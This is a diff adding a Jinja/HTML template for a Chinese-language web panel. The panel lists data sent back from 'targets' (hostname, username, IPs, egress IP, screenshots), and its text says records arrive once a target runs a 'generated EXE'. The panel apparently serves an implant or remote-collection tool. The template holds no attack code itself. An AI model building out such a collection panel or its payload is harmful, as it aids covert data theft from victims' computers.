@@ -1,0 +1,116 @@
+<div class="col-fragment"
+     data-collections-fragment
+     data-collections-base="{{ url_for('routes_web.target_collections_modal', target_id=target.id) }}"
+     data-collections-total="{{ pagination.total }}">
+    {% if collections %}
+    <div class="table-wrap">
+        <table class="table table-callbacks">
+            <colgroup>
+                <col class="col-cb-idx">
+                <col class="col-cb-host">
+                <col>
+                <col class="col-cb-exit">
+                <col class="col-cb-shot">
+                <col class="col-cb-time">
+                <col class="col-cb-action">
+            </colgroup>
+            <thead>
+                <tr>
+                    <th class="col-idx">#</th>
+                    <th>计算机名 / 用户</th>
+                    <th>IP</th>
+                    <th class="hide-sm">出口 IP</th>
+                    <th>截图</th>
+                    <th class="hide-sm">回传时间</th>
+                    <th class="col-row-action"></th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for c in collections %}
+                <tr>
+                    <td class="num">{{ pagination.start + loop.index0 }}</td>
+                    <td>
+                        <span class="cell-title">{{ c.hostname or '未知计算机' }}</span>
+                        <span class="cell-sub">{{ c.username or '—' }}</span>
+                    </td>
+                    <td>
+                        {% if c.ip_first %}
+                        <code class="mono ip-main" title="{{ c.ip_address }}">{{ c.ip_first }}</code>
+                        {% if c.ip_extra %}<span class="ip-more">+{{ c.ip_extra }}</span>{% endif %}
+                        {% else %}
+                        <span class="muted">—</span>
+                        {% endif %}
+                    </td>
+                    <td class="hide-sm"><code class="mono">{{ c.exit_ip or '—' }}</code></td>
+                    <td>
+                        {% if c.screenshot_path %}
+                        <a class="callback-thumb"
+                           href="{{ url_for('routes_web.uploaded_file', filename=c.screenshot_path) }}"
+                           data-lightbox="{{ url_for('routes_web.uploaded_file', filename=c.screenshot_path) }}"
+                           title="查看完整截图">
+                            <img src="{{ url_for('routes_web.uploaded_file', filename=c.screenshot_path) }}"
+                                 alt="{{ c.hostname or target.name }} 的屏幕截图" loading="lazy">
+                        </a>
+                        {% else %}
+                        <span class="thumb-empty" aria-label="无截图">
+                            <svg class="icon" aria-hidden="true"><use href="#i-image"></use></svg>
+                        </span>
+                        {% endif %}
+                    </td>
+                    <td class="hide-sm"><span class="num nowrap">{{ c.received_at }}</span></td>
+                    <td class="col-row-action">
+                        <button class="btn btn-secondary btn-sm" type="button"
+                                data-collection-url="{{ url_for('routes_web.collection_detail_modal', target_id=target.id, collection_id=c.id) }}"
+                                data-collection-title="{{ c.hostname or c.ip_address or '回传记录' }}">详情</button>
+                    </td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    <div class="col-fragment-foot">
+        <div class="col-fragment-info">
+            <span>共 {{ pagination.total }} 条</span>
+            <span>第 {{ pagination.page }} / {{ pagination.total_pages }} 页</span>
+            <label class="col-page-size">每页
+                <select data-col-page-size>
+                    {% for size in page_sizes %}
+                    <option value="{{ size }}" {% if size == pagination.page_size %}selected{% endif %}>{{ size }}</option>
+                    {% endfor %}
+                </select>
+            </label>
+        </div>
+        {% if pagination.total_pages > 1 %}
+        <nav class="pagination" aria-label="回传记录分页">
+            {% if pagination.has_prev %}
+            <a class="page-btn" href="#" data-col-page="{{ pagination.page - 1 }}" data-col-size="{{ pagination.page_size }}" aria-label="上一页">上一页</a>
+            {% else %}
+            <span class="page-btn is-disabled" aria-disabled="true">上一页</span>
+            {% endif %}
+
+            {% for item in pagination.page_items %}
+            {% if item is none %}
+            <span class="page-ellipsis">…</span>
+            {% elif item == pagination.page %}
+            <span class="page-btn active" aria-current="page">{{ item }}</span>
+            {% else %}
+            <a class="page-btn" href="#" data-col-page="{{ item }}" data-col-size="{{ pagination.page_size }}">{{ item }}</a>
+            {% endif %}
+            {% endfor %}
+
+            {% if pagination.has_next %}
+            <a class="page-btn" href="#" data-col-page="{{ pagination.page + 1 }}" data-col-size="{{ pagination.page_size }}" aria-label="下一页">下一页</a>
+            {% else %}
+            <span class="page-btn is-disabled" aria-disabled="true">下一页</span>
+            {% endif %}
+        </nav>
+        {% endif %}
+    </div>
+    {% else %}
+    <div class="empty empty-sm">
+        <span class="empty-icon"><svg class="icon" aria-hidden="true"><use href="#i-database"></use></svg></span>
+        <div class="empty-title">该目标暂无回传数据</div>
+        <div class="empty-text">目标运行生成的 EXE 并成功出网后，记录会出现在这里。</div>
+    </div>
+    {% endif %}
+</div>
